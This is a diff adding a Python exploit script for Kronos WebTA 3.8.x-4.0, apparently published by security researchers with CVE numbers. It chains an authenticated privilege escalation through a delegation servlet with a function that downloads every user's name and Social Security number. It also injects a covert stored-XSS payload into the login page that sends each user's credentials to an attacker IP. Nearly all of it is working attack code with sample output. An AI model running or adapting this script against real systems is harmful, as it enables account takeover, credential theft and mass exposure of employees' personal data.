@@ -1,0 +1,293 @@
+#  Exploit Title: Kronos WebTA 4.0 - Authenticated Remote Privilege Escalation
+#  Discovered by: Elwood Buck & Nolan B. Kennedy of Mindpoint Group
+#  Exploit Author: Nolan B. Kennedy (nxkennedy)
+#  Discovery date: 2019-09-20
+#  Vendor Homepage: https://www.kronos.com/products/kronos-webta
+#  Version: 3.8.x - 4.0 affected. (Exploit tested on v3.8.6.79029)
+#  Tested on: Linux
+#  CVE: (Remote Privesc) CVE-2020-8495 | (Stored XSS) CVE-2020-8493
+#  Usage: python3 exploit.py http://target
+
+#!/bin/bash/python3
+
+###
+# *Exploit requires credentials with Timekeeper or Supervisor privileges
+#
+# Exploit abuses delegation privs present in the WebTA "/servlet/com.threeis.webta.H491delegate"
+# servlet. By specifying the "delegate" and "delegatorUserId" parameter an attacker can use an
+# admin user id to delegate role 5 (aka admin privs) to any other known user id, including oneself.
+#
+# selFunc=add&selRow=&delegate=<ATTACKER>&delegateRole=5&delegatorEmpId=1234&delegatorUserId=<ADMIN>
+#
+# With our new admin account, we can abuse a stored XSS vulnerability present in the login page,
+# banner (displayed on every page) & password reset page. We can also pull system information and
+# download a file containing the FULL NAME AND SSN OF EVERY USER in the database (typically thousands).
+#
+#
+# Below is an example of the exploit output:
+#####
+# [+] Logged in as 'TESTER' with roles: Employee, Timekeeper
+#
+# [+] Available Admin Accounts:
+# MOTOKO
+# BATOU
+# TOGUSA
+# ISHIKAWA
+#
+# [-] Attempting to use account 'MOTOKO' to delegate Admin privs to 'TESTER'...
+#
+# [+] 'TESTER' successfully elevated to Admin privs :)
+#
+#
+# [+] Logged in as 'TESTER' with roles: Employee, Timekeeper, Admin
+#
+# [+] Webta Version Information
+# Site parameter: company
+# Licensed modules:WEBTA-LEAVE, WEBTA, WEBTA
+# webTA Servlet Version: 3.8.6.79029
+# webTA Database Version: 3.8.6.79029
+# App Server OS: Linux version 3.10.0-1062.1.1.el7.x86_64 (amd64)
+# App Server JDK Version: Oracle Corporation version 1.8.0_222
+# App Server Servlet Engine: Apache Tomcat/7.0.76 (Servlet API 3.0)
+# App Server JDBC Driver: Oracle JDBC driver version 11.2.0.4.0
+# Database Version:  Oracle JDBC driver version 11.2.0.4.0
+# Database Connection: jdbc:oracle:thin:@//foo.rds.amazonaws.com:1521/webtadb<br>connected as user WEBTASVC
+#
+# [-] Downloading names and SSNs...
+#
+# [+] Complete. 5020 users written to file 'WebTA-PII.xls'
+# [+] Sample Content:
+# USERID,Last Name,First Name,Middle Name,SSN,Supervisor ID,Timekeeper ID,Organization,Pay Period,Active Status,
+# MOTOKO,Kusanagi,Major,M.,987-65-4321,ARAMAKI,ARAMAKI,SECTION9,19,Active,
+#
+# [+] Stored XSS attack complete :)
+#####
+
+import re
+from requests import Request, Session
+from sys import argv, exit
+
+
+
+
+banner = """###
+#  Kronos WebTA 3.8.x - 4.0 Authenticated Remote Privilege Escalation & Stored XSS Exploit
+#  Discovered by: Elwood Buck & Nolan B. Kennedy of Mindpoint Group
+#  Exploit Author: Nolan B. Kennedy (nxkennedy)
+#  Discovery date: 20 SEPT 2019
+#  Vendor Homepage: https://www.kronos.com/products/kronos-webta
+#  Version: 3.8.x - 4.0 affected. (Exploit tested on v3.8.6.79029)
+#  Tested on: Linux
+#  CVE: (Remote Privesc) CVE-2020-8494 | (Stored XSS) CVE-2020-8493
+#  Usage: python3 exploit.py http://target
+###"""
+base_url = argv[1]
+username = "TESTER"
+password = "password!1234"
+# set to True if you want to also exploit Stored XSS
+xss = False
+# xss strings can be injected into 3 different 'banner' locations (feel free to modify content)
+# WILL NOT ERASE CONTENT ALREADY IN APPLICATION
+xss_login_page = """
+<script>
+/* steals login creds each time a user logs in and forwards them to attacker ip */
+
+var attacker = "192.168.1.3";
+
+/* don't forget to set up a listener (python3 -m http.server 80) */
+function stealCreds() {
+        var username = document.frm[1].value;
+        var password = document.frm[2].value;
+        img = new Image();
+        img.src = "http://"+attacker+"/?"+ "username=" +username+ "&" + "password=" +escape(password);
+        setTimeout('document.frm.submit();', 1000);
+        return false;
+        }
+
+function readyToSteal() {
+	document.frm.onsubmit = stealCreds;
+	}
+
+/* special for WebTA because otherwise the script loads before the DOM and password form */
+document.addEventListener("DOMContentLoaded", readyToSteal);
+</script>
+"""
+xss_banner_everypage = ""
+xss_passwordchange_page = ""
+s = Session()
+adm_list = []
+
+
+
+def web_req(url, data):
+	print()
+	req = Request('POST', url, data=data)
+	prepared = s.prepare_request(req)
+	resp = s.send(prepared, allow_redirects=True, verify=False)
+	return resp
+
+
+
+def killActiveSession():
+	url = base_url + "/servlet/com.threeis.webta.H111multipleLogin"
+	data = {"selFunc":"continue"}
+	resp = web_req(url, data)
+
+
+
+def checkPrivs():
+	url = base_url + "/servlet/com.threeis.webta.HGateway"
+	data = {}
+	resp = web_req(url, data)
+	html = resp.text
+	activeSession = roles = re.findall(r'(.*?)You have an active session open at a another browser(.*?)\.', html)
+	roles = re.findall(r'(.*?)type\="button"(.*?)>', html)
+	if activeSession:
+		print("[-] Killing active session...")
+		killActiveSession()
+		login()
+	elif roles:
+		roles_list = []
+		for role in roles:
+			role = role[1].split('"')[1]
+			roles_list.append(role)
+		print("[+] Logged in as '{}' with roles: {}".format(username, ', '.join(roles_list)))
+
+	else:
+		print("[!] Account does not have required Timekeeper or Supervisor privs")
+		exit()
+
+
+
+def login():
+	url = base_url + "/servlet/com.threeis.webta.H110login"
+	data = {"j_username": username, "j_password": password, "login": "++Log+In++"}
+	resp = web_req(url, data)
+	if resp.status_code != 200:
+		print("[!] Failed login in as '{}'".format(username))
+		exit()
+	checkPrivs()
+
+
+
+def findAdmins():
+	url = base_url + "/servlet/com.threeis.webta.H940searchUser"
+	data = {
+        "selFunc":"search",
+        "return_page":"com.threeis.webta.P491delegate",
+        "return_variable":"delegate",
+        "search_org":"0",
+        "search_role":"Administrator",
+        "actingRole":"2",
+        "payload_name_0":"selFunc",
+        "payload_val_0":"search",
+        "payload_name_1":"selRow",
+        "payload_name_2":"delegate",
+        "payload_name_3":"delegateRole",
+        "payload_val_3":"2",
+        "payload_name_4":"delegatorEmpId",
+        "payload_val_4":"15667", # might need a valid user id
+        "payload_name_5":"delegatorUserId",
+        "payload_val_5":username,
+        }
+	resp = web_req(url, data)
+	html = resp.text
+	adm_usrs = re.findall(r'<TD CLASS\="bckGray">(.*?)\n', html)
+	print("[+] Available Admin Accounts:")
+	for snip in adm_usrs:
+        	adm = snip.split('</TD><TD CLASS="bckGray">')[2]
+        	adm_list.append(adm)
+        	print(adm)
+
+
+
+def privesc():
+	url = base_url + "/servlet/com.threeis.webta.H491delegate"
+	data = {
+	"selFunc":"add",
+	"delegate":username,
+	"delegateRole":"5",
+	"delegatorEmpId":"1234",
+	"delegatorUserId":adm_list[0],
+	}
+	print()
+	print("[-] Attempting to use account '{}' to delegate Admin privs to '{}'...".format(adm_list[0], username))
+	resp = web_req(url, data)
+	print("[+] '{}' successfully elevated to Admin privs :)".format(username))
+
+
+
+def storeXSS():
+	url = base_url + "/servlet/com.threeis.webta.H261configMenu"
+	data = {'selFunc':'messages'}
+	### to be covert we want to append our js to the end of * messages/banners already there *
+	resp = web_req(url, data)
+	html = resp.text
+	messages = re.findall(r'<TEXTAREA name\=(.*?)</textarea>', html, re.DOTALL)
+	messages_clean = []
+	for message in messages:
+		message = message.split('wrap="virtual">')[1]
+		messages_clean.append(message)
+	login_page = messages_clean[0]
+	banner_everypage = messages_clean[1]
+	passwordchange_page = messages_clean[2]
+
+	###  now we inject our javascript
+	url = base_url + "/servlet/com.threeis.webta.H201config"
+	data = {
+		"selFunc":"save",
+		"loginMessage": login_page + xss_login_page,
+		"bannerMessage": banner_everypage + xss_banner_everypage,
+		"passwordMessage": passwordchange_page + xss_passwordchange_page,
+	}
+	resp = web_req(url, data)
+	print("[+] Stored XSS attack complete :)")
+
+
+
+def stealPII():
+	url = base_url + "/servlet/com.threeis.webta.H287userRoleReport"
+	data = {
+	"selFunc":"downloademp",
+	"roletype":"1",
+	"orgsel":"0",
+	"pageNum":"1",
+	}
+	print("[-] Downloading names and SSNs...")
+	resp = web_req(url, data)
+	filename = "WebTA-PII.xls"
+	with open(filename, 'wb') as f:
+		f.write(resp.content)
+	with open(filename) as f:
+		for i, l in enumerate(f):
+			pass
+	count = i # does not include header
+	print("[+] Complete. {} users written to file '{}'".format(count, filename))
+	print("[+] Sample Content:")
+	with open(filename) as f:
+		for n in range(2):
+			print(",".join(f.readline().split("\t")), end="")
+
+
+
+def dumpSysInfo():
+	url = base_url + "/servlet/com.threeis.webta.H200mnuAdmin"
+	data = {"selFunc":"about"}
+	resp = web_req(url, data)
+	html = resp.text
+	data = re.findall(r'<INPUT VALUE\="(.*?)"', html, re.DOTALL)
+	print("[+] " + data[0])
+
+
+
+if __name__ == '__main__':
+	print(banner)
+	login()
+	findAdmins()
+	privesc()
+	login() # login again because we need the refreshed perms after privesc
+	dumpSysInfo()
+	#stealPII()
+	if xss:
+		storeXSS()
+	s.close()
